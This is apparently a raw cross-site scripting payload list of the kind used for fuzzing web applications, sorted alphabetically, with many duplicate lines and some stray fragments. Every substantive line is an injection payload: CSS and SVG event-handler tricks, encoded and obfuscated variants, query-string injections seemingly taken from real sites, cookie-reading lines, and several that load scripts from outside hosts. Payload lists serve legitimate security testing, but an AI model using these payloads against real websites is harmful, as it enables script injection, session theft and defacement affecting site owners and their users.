<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>@import'javascript:alert("XSS")';</STYLE>
<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
>"<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
<STYLE>li {list-style-image: url("javascript:alert('CrossSiteScripting')");}</STYLE><UL><LI>CrossSiteScripting
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>CrossSiteScripting
>"<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>CrossSiteScripting
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
 style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
}</style><script>a=eval;b=alert;a(b(/i/.source));</script>
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
&'"--></style></script><script>alert('XSS')</script>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<style><!--</style><script>document.cookie=true;//--></script>
>"<style><!--</style><script>document.cookie=true;//--></script>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScripting')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE>
>"<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<STYLE TYPE="text/javascript">alert('CrossSiteScripting');</STYLE>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<style type="text/javascript">document.cookie=true;</style>
>"<style type="text/javascript">document.cookie=true;</style>
<STYLE TYPE="text/javascript">document.cookie=true;</STYLE>
>"<STYLE TYPE="text/javascript">document.cookie=true;</STYLE>
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<// style=x:expression\28javascript:alert(1)\29>
<// style=x:expression\28javascript:alert(1)\29>
<// style=x:expression\28write(1)\29>
</**/style=x:expression\28write(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
&sType=BEGINSECURE&sProcess_Name="><script>alert('XSS')</script>
&styper=query&sword=%3Cscript%20/***/%3E/***/confirm%28document.domain%29/***/%3C/script%20/***/&Start+Search.x=0&Start+Search.y=0
&subSection=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&headParams=management
&success_page=%2F%22%3E%3Ch1%3EXSS%20by%20PsychoMantis%3C/h1%3E%27%22%3E%3C/title%3E%3Cscript%3E%20alert%28%22XSSPOSED%22%29%3C/script%3E%3E/
<svg%09%28%3Bonload=confirm(1);>
<svg %09onload%09=prompt(1)>
<svg%20onload=evt.target.innerHTML=evt.target.ownerDocument.URL>#<img src=/ onerror=alert(domain)>
<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(2)//"></svg> // By Secalert
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg><div onactivate=alert('Xss') id=xss style=overflow:scroll>
<svg/language=vbs onload=msgbox-1
<svg/onload%0B=prompt(1)>
<SVG/ONLOAD=&#112&#114&#111&#109&#112&#116(1) // Cross Browser
<svg/onload=alert(1)
<svg/onload=alert(1)
<svg/onload=alert(1)
<svg/onload=alert(1)
<svg/onload=alert(1)
<svg/onload=alert(1)
<svg/onload=body[name]=URL%0d#</svg><img src=x onerror=alert(1)>"
<svg/onload=eval(atob(location.hash.slice(1)))>#YWxlcnQoMSkvLw==
<svg/onload=eval(location.hash.slice(1))>?#alert(1)
<svg onload=eval(window.name)//
<svg onload=evt.target[/innerHT/.source%2b/ML/.source]=evt.target[/ownerDocumen/.source%2b/t/.source][/U R/.source%2b/L/.source]#<img src=/ onerror=alert(domain)>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]#:()
<svg/onload=location=name//
<svg/onload=location=name//>
<svg/onload=location=name//”>CLICK</a>
<svg/onload=parent[/loca/.source%2b/tion/.source]=name//
<svg/onload=prompt(1);>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<svg/onload=top[‘loca’%2b’tion’]=name//
<svg/onload=top[/loca/.source%2b/tion/.source]=name//
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<svg><script ?>alert(1)
<svg><script ?>alert(1)
<svg><script ?>alert(1)
<svg><script ?>alert(1)
<svg><script ?>alert(1)
<svg><script ?>alert(1)
"><svg><script>alert`1`
<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;<p>
<svg><script>alert&grave;1&grave;<p>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script>prompt&#40 1&#41<i>
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<svg><use xlink:href="data:image&sol;svg&plus;xml&semi;ba &NewLine;se&Tab;64&semi;&comma;PHN2ZyBpZD 0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53M y5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodH RwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3a WR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8 YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0K GxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lk dGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC 9zdmc+#rectangle" /></svg>
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\u0061lert(1);"></g></svg> // By Secalert
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/> // By Mario
&s=XSSPOSED%27%29;};%3C/script%3E%3Cscript%3Ealert%28%20/XSSPOSED/%29%3C/script%3E%27
&symb=%22%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3Ca
t
t
&t=1&cve_id="</title><body onload=alert("XSS")>
&t=2444
<TABLE BACKGROUND="javascript:alert('CrossSiteScripting')">
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
<TABLE BACKGROUND="javascript:document.cookie=true;">
>"<TABLE BACKGROUND="javascript:document.cookie=true;">
<table background="javascript:javascript:alert(1)">
<table background="javascript:javascript:alert(1)">
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:alert('CrossSiteScripting')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
>"<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
&tab=searchtabgeneraldark&MT=%22%3E%3Cbody%20onload=alert%28%22XSS%22%29%3E
&tag=%22%3E%3Cscript%20src%3d//ckers.org/s%3E%3C/script%3E
&TargetUrl=LST_NOM_DTL_GLOSSARY&StrNom=CODED2&StrLanguageCode=%22%3E%3Cmarquee/onstart=alert%28/XSSPOSED/%29%3E
&tbid="><script>alert('XSS')</script>
&teamno=&type=%22%3E%3Cscript%3Ealert%28%270%27%29;%3C/script%3E
&template=en_search_error&postalCode=\\';alert(0)//
&term="%20onfocus="if%28!this.a%29{alert%28String.fromCharCode%2888,83,83%29%29}this.a=1;"%20AUTOFOCUS/>
&term=%22%3C/script%3E%3Cscript%3Ealert%28%22xss%22%29%3B%3C%2Fscript%3E%3C!--
&term=%3C%62%6F%64%79%20%6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%22%58%53%53%22%29%3E
&term=<script>alert("HI REDDIT")</script>
&Term='"></title><script>alert(xss)</script>><marquee><h1>XSS</h1></marquee>
&term="</title><script>if (!window.xss) { window.xss=1; alert("XSS"); }</script>&start=0
&text=%3C%2Fgrkgnern%3E%3Cfpevcg%3Enyreg%280%29%3C%2Ffpevcg%3E
&text=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
&text=%3Cscript%3Ealert('test')%3C/script%3E
<textarea autofocus onfocus=alert(1)>
</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
</textarea>'"><script>alert(document.cookie)</script>
</textarea><script>alert(/xss/)</script>
&text=awdawdawd%27%3balert%28%22xss%22%29%3b%2f%2f
&text=file-sharing/universities&page="><script>alert('XSS')</script>
&theStyle=COABETA&lang=en%22%3E%3Cscript%3Ealert%28%22Silly%20NRO,%20XSS%20is%20for%20kids!%22%29;document.write%28%22%3Cimg%20src=%27http://img651.imageshack.us/img651/2102/6a00d83451c49a69e201348.jpg%27%20style=%27display:block;position:absolute;top:0;left:0;%27/%3E%22%29;%3C/script%3E
<title onpropertychange=javascript:alert(1)></title><title title=>
<title onpropertychange=javascript:alert(1)></title><title title=>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
&titleOrPublisher=%3Cbody%20onload=alert(%22XSS!%22)%3E&searchType=title&rating=&ratingsCriteria=&platforms=&platformsCriteria=&searchVersion=compact&content=&searchType=title&contentCriteria=&newSearch.x=38&newSearch.y=11
'"></title><script>alert(1111)</script>
</title><script>alert(1)</script>
</TITLE><SCRIPT>alert("CrossSiteScripting");</SCRIPT>
</title><script>alert(/xss/)</script>
&title="><script>alert('XSS')</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
>"</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
&topic=%22%20onload=%22alert%28'XSS'%29
&topic=The%20O%27Reilly%20Store%3E%3C/title%3E%3C/head%3E%3Cbody%20onload=%22alert%28%27Fuck%20it!%20We%60ll%20do%20it%20live!%27%29;%22%20%3E%3Cimg%20src=%22http://bit.ly/h52DeS%22%20style=%22position:absolute;top:0;left:0;width:250px%22/%3E
top.__proto__._= alert
&tree=411"><script>alert(String.fromCharCode(88,83,83))</script>
&true&lenta=1'"\\></title><svg/onload=confirm(/xssposed/)>
<t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>alert("CrossSiteScripting")</SCRIPT>">
&&tutorial=%22%3Cmarquee%3EPreventing%20xss%20attacks%3Ca
&type=City&city=%22--%3E%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E
&type=itpPeople&pageLength=5&q=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22
&type=keywords&term='};alert('hi');a(function(){a(function(){%2f*&location=&CMP=AFC-NLCN&x=9&y=6
&type="><script>alert('XSS')</script>
\u003c
\u003C
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A
&uem=%3Cscript%3Ealert(%27%2b/hi/.toString().substring(1,3))%3C/script%3E
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
&uGlobalSearch=%22%3E%3Ch1+onmouseenter%3Dconfirm%28%2Fxssposed%2F%29%3E
&uq=and(/></script><script>alert('0');</script>)
&url=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E
&url=*/%22%3E%3C/textarea%3E%3Cscript%3Ealert(&title=1%22);%3C/script%3E
&URL=%27;%22;alert%28%27xssd%27%29;a=%22
&url=http://m.mtv.com&css=%22%3E%3Cimg+src%3DX+onerror%3Dalert%28%22xssposed%22%29%3E
&url=iel5%2F8945%2F28322%2F01266233.pdf%3Farnumber%3D1266233"><script>alert(String.fromCharCode(88,83,83))</script>
&url=javascript:alert(0)
&url=javascript:alert%28document.domain%29
[url=javascript:alert('XSS');]click me[/url]
&u="><script>alert(String.fromCharCode(88,83,83))</script>
ûscriptualert(EXSSE)û/scriptu
&user=<script>alert('Hey reddit')</script>
&us=ndmnews&as="><img%20src="http://imgur.com/images/mario-404.gif"</>&q=a
&utilitycode=wxKzWlc34-1765&newMemberText=%3Cp%3E%3Cb%3EEasiest%20XSS%20ever!%20Holy%20crap!%3C/b%3E%3C/p%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
&utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+zdnet%2Fsecurity+%28ZDNet+Zero+Day%29&utm_content=Google+Reader
&utm_source=twitterfeed&utm_medium=twitter
v
V
&v=';alert();a='
<var onmouseover="prompt(1)">On Mouse Over</var>
<var onmouseover="prompt(1)">On Mouse Over</var>
<var onmouseover="prompt(1)">On Mouse Over</var>
<var onmouseover="prompt(1)">On Mouse Over</var>
<var onmouseover="prompt(1)">On Mouse Over</var>?
<var onmouseover="prompt(1)">On Mouse Over</var>​
vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
<video onerror="javascript:javascript:alert(1)"><source>
<video onerror="javascript:javascript:alert(1)"><source>
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
<video poster=javascript:javascript:alert(1)//
<video poster=javascript:javascript:alert(1)//
&video_query=%27%27}}%29%3Balert%28%27XSS%27%29%3Bvar%20a%3D%28{b%3A{b%3A%27
<video><source onerror="javascript:alert(1)">
<video><source onerror="javascript:javascript:alert(1)">
<video><source onerror="javascript:javascript:alert(1)">
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<video src=1 onerror=alert(1)>
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
<video src=_ onloadstart="alert(1)">
<video src=x onerror=prompt(1);>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
&v=s_78bk3dZcc
&v=xss'%3E%3C/a%3E%3Cscript%20src%3D%22http://www.yourjavascript.com/38310202111/xss.js%22%3E%3C/script%3E
&v=zTD4CYnm34c
&wBumper=fullexternal&advertiser=%27;}--%3E%3C/script%3E%3Cscript%3Ejavascript:prompt%28/XSSPOSED/%29%3C/script%3E
&wd=%3Cimg+src%3D%40+onerror%3Dalert%282
&where=%3Cbody%20onload=alert%28/XSS/.source%29%3E
&where=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&loctypes=1003%2C1001%2C1000%2C1%2C9%2C5%2C11%2C13%2C19%2C20&from=hdr_localsearch
width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
window["ale" + (!![]+[])[+!+[]]+(!![]+[])[+[]]](1)
window["alert"](1)
window.alert("Bonjour !");
with(document.__parent__)alert(1)
with(location)with(hash)eval(substring(1))
&woord=%3Cbody%20onload=alert('XSS')%3E
&word=%3Cscript%3Ealert%28/XSS/.source%29;%3C/script%3E
&words=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E
&wpmlmethod=optin&wpmlformid="><script>alert(String.fromCharCode(88,83,83))</script>
&WRD='%20|%20alert%28'XSS'%29%20|%20'&ern=200
&#x000003c
&#x000003c;
&#x000003C
&#x000003C;
&#X000003c
&#X000003c;
&#X000003C
&#X000003C;
&#x00003c
&#x00003c;
&#x00003C
&#x00003C;
&#X00003c
&#X00003c;
&#X00003C
&#X00003C;
&#x0003c
&#x0003c;
&#x0003C
&#x0003C;
&#X0003c
&#X0003c;
&#X0003C
&#X0003C;
&#x003c
&#x003c;
&#x003C
&#x003C;
&#X003c
&#X003c;
&#X003C
&#X003C;
<\x00img src='1' onerror=alert(0) />
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
'`"><\x00script>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
&#x03c
&#x03c;
&#x03C
&#x03C;
&#X03c
&#X03c;
&#X03C
&#X03C;
&x=0&y=0&q=%22%3E%3Cinput%20type=%22search%22%20onsearch=prompt(/XSSPOSED/)%20%20autofocus%3E%3C---Press+Enter++Mini+Textbox+To+trigger
&x=0&y=0&s=%3Cbody%20onload=alert(%22XSS%22)%3E
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
\x3c
&#x3c
&#x3c;
\x3C
&#x3C
&#x3C;
&#X3c
&#X3c;
&#X3C
&#X3C;
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x3Cscript>javascript:alert(1)</script>
\x3Cscript>javascript:alert(1)</script>
\x3Cscript>javascript:alert(1)</script>
&#x3C;&#x69;&#x66;&#x72;&#x61;&#x6D;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x74;&#x65;&#x73;&#x74;&#x2E;&#x64;&#x65;&#x3E;
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
">/XaDoS/><script>alert(document.cookie)</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
&xfrom=1&search=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&ind=1&zoek1=yes
<XML ID="CrossSiteScripting"><I><B><IMG SRC="javas<!-- -->cript:alert('CrossSiteScripting')"></B></I></XML>
<XML ID="CrossSiteScripting"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
>"<XML ID="CrossSiteScripting"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('CrossSiteScripting');">]]>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
>"<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
>"<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
